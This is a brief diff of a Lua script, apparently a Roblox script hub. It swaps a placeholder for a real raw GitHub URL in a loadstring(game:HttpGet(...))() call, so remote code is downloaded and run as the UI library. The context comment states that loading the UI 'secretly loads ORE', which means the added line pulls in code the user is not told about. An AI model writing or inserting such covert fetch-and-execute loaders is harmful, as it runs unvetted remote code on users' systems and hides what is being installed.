@@ -1,5 +1,5 @@
 -- The user loads the UI (which secretly loads ORE)
-local Library = loadstring(game:HttpGet(".../DynahaxUI.lua"))()
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/kenneth296krnny/files/refs/heads/main/OreUi/Dynahax.lua"))()
 
 local Window = Library.new("My Script Hub")
 
